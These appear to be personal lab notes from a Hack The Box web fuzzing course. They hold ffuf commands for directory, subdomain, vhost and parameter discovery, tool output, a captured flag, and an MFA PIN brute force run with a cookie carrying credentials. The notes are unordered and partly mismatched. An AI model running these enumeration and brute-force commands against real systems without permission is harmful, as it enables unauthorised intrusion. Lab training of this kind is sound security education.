locaear```

ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt:FUZZ -u http://10.10.114.20/FUZZ

```

```
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://10.10.199.201/FUZZ.php

```

```shell-session
ffuf -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://10.10.199.201/FUZZ -recursion -recursion-depth 1 -e .php -v


HTB{fuzz1n6_7h3_w3b!}
```

```shell-session
sudo sh -c 'echo "SERVER_IP  academy.htb" >> /etc/hosts'

```


```shell-session
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://FUZZ.hackthebox.eu/


store                   [Status: 301, Size: 91, Words: 5, Lines: 1]

```

```shell-session
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:PORT/ -H 'Host: FUZZ.academy.htb' -fs 900
```

`https://admin.academy.htb:31603/blog/index.php`,

```
ffuf -w /opt/useful/SecLists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://academy.htb:32508/ -H 'Host: FUZZ.academy.htb' -fs 900
```

```
ffuf -u 'http://10.10.229.253/console/mfa.php' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://10.10.229.253/console/mfa.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Origin: http://10.10.229.253' -H 'Connection: keep-alive' -H 'Cookie: PHPSESSID=6lne9nb2pck576cpr1kqr0e2aj; user=jason_test_account; pwd=violet' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0' -d 'code=FUZZ' -w 4-digit-pin-list.txt -fw 183



fuff -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://faculty.academy.htb:31564/courses/linux-security.php7 -X POST -d 'FUZZ=key' -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' -H 'Cache-Control: max-age=0'
```
 ## can filter it out with `-fs 900`
```
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://157.245.37.27:30334/ -H 'Host: FUZZ.academy.htb' -fs 986
```


```shell-session
ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php?FUZZ=key -fs xxx
``````shell-session
ffuf -w /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'FUZZ=key' -H 'Content-Type: application/x-www-form-urlencoded' -fs xxx


        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.1.0-git
________________________________________________

 :: Method           : POST
 :: URL              : http://admin.academy.htb:PORT/admin/admin.php
 :: Wordlist         : FUZZ: /opt/useful/SecLists/Discovery/Web-Content/burp-parameter-names.txt
 :: Header           : Content-Type: application/x-www-form-urlencoded
 :: Data             : FUZZ=key
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403
 :: Filter           : Response size: xxx
________________________________________________

id                      [Status: xxx, Size: xxx, Words: xxx, Lines: xxx]
<...SNIP...>
```

As we can see this time, we got a couple of hits, the same one we got when fuzzing `GET` and another parameter, which is `id`. Let's see what we get if we send a `POST` request with the `id` parameter. We can do that with `curl`, as follows:

```shell-session
Avataris1210@htb[/htb]$ curl http://admin.academy.htb:PORT/admin/admin.php -X POST -d 'id=key' -H 'Content-Type: application/x-www-form-urlencoded'

<div class='center'><p>Invalid id!</p></div>
<...SNIP...>
```

As we can see, the message now says `Invalid id!`.

##### Table of Contents

###### Introduction

curl -i -s -k -X $'GET' \
    -H $'Host: 206.189.117.48:32470' -H $'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0' -H $'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8' -H $'Accept-Language: en-US,en;q=0.5' -H $'Accept-Encoding: gzip, deflate' -H $'Connection: close' -H $'Upgrade-Insecure-Requests: 1' -H $'Cache-Control: max-age=0' \
    -b $'cookie=084e0343a0486ff05530df6c705c8bb4' \
    $'http://206.189.117.48:32470/skills/'

ffuf -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt:FUZZ -u 
http://206.189.117.48:32470/skills/ -b $'cookie=FUZZ' 

###### Basic Fuzzing

###### Domain Fuzzing

ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt:FUZZ -u http://10.10.120.223/csv?FUZZ=key -fs 798

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1 Kali Exclusive <3
________________________________________________

 :: Method           : GET
 :: URL              : http://admin.academy.htb:30611/admin/admin.php?FUZZ=key
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
 :: Filter           : Response size: 798
________________________________________________

user                    [Status: 200, Size: 783, Words: 221, Lines: 54]
:: Progress: [2588/2588] :: Job [1/1] :: 694 req/sec :: Duration: [0:00:06] :: Errors: 0 ::

---

ffuf -w ids.txt:FUZZ -u http://admin.academy.htb:31561/admin/admin.php -X POST -d 'id=FUZZ' -H 'Content-Type: application/x-www-form-urlencoded' -fs 768

curl http://admin.academy.htb:31561/admin/admin.php -X POST -d 'id=73' -H 'Content-Type: application/x-www-form-urlencoded'

---

## Skills Assessment - Web Fuzzing
ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt:FUZZ -u http://10.10.199.201/ -H 'Host: FUZZ.academy.htb' -fs 985

test                    [Status: 200, Size: 0, Words: 1, Lines: 1]
archive                 [Status: 200, Size: 0, Words: 1, Lines: 1]
faculty                 [Status: 200, Size: 0, Words: 1, Lines: 1]
